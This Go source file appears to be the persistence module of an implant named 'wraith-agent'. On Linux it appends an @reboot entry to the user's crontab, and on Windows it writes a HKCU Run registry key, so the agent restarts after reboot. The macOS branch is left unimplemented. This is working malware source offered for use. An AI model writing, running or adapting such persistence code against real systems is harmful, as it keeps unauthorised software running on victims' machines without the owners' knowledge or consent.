package modules

import (
	"fmt"
	"os/exec"
	"runtime"
)

// Persist installs the agent to survive reboot.
func Persist() error {
	switch runtime.GOOS {
	case "linux":
		return persistLinux()
	case "windows":
		return persistWindows()
	case "darwin":
		return persistMacOS()
	default:
		return fmt.Errorf("unsupported OS for persistence: %s", runtime.GOOS)
	}
}

func persistLinux() error {
	// ponytail: simple crontab entry for every minute
	// In a real scenario, we'd find the binary path first.
	cronCmd := `@reboot /tmp/wraith-agent`
	cmd := exec.Command("sh", "-c", fmt.Sprintf("(crontab -l ; echo \"%s\") | crontab -", cronCmd))
	return cmd.Run()
}

func persistWindows() error {
	// ponytail: Registry Run key
	cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "WraithAgent", "/t", "REG_SZ", "/d", "C:\\Users\\Public\\wraith-agent.exe", "/f")
	return cmd.Run()
}

func persistMacOS() error {
	// ponytail: LaunchAgent
	// Minimal implementation: just a placeholder since MacOS requires a plist file.
	return fmt.Errorf("macos persistence not yet implemented")
}
